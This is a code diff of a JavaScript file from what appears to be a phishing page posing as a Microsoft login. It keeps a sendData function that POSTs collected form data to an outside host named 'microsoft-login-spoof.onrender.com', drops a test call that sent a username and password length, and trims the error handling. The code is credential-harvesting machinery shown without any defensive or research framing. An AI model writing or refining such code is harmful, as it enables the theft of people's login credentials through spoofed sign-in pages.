@@ -21,40 +21,14 @@ const createBody = (data) => {
 
     return urlEncodedData;
 }
-fetch('https://microsoft-login-spoof.onrender.com/userdata', {
-    method: 'POST',
-    body: createBody({userName: 'test', passwordLength: 10}),
-}).then(response => {
-    console.log('response', response);
-})
 
 const sendData = (data) => {
     fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
         method: 'POST',
-        cache: 'no-cache',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        referrerPolicy: 'no-referrer',
         body: createBody(data),
+    }).then(response => {
+        console.log('response', response);
     })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok ' + response.statusText);
-            }
-            return response.json();
-        })
-        .then(data => {
-            console.log('Success:', data);
-        })
-        .catch(error => {
-            console.error('There was a problem with the fetch operation:', error);
-            if (error instanceof TypeError) {
-                console.error('TypeError:', error.message);
-            } else {
-                console.error('Other Error:', error.message);
-            }
-        });
 }
 
 function validateEmail(email) {
